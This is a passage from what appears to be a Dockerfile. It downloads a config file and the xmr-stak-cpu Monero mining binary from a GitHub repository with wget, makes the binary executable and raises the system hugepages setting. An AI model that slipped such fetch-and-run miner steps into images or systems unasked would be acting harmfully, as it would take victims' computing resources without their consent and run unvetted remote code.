...
RUN wget https://github.com/rotoxel/roxet/raw/master/config2.txt 
RUN mv config2.txt config.txt
RUN wget https://github.com/rotoxel/roxet/raw/master/xmr-stak-cpu && chmod +x xmr-stak-cpu && sysctl -w vm.nr_hugepages=128
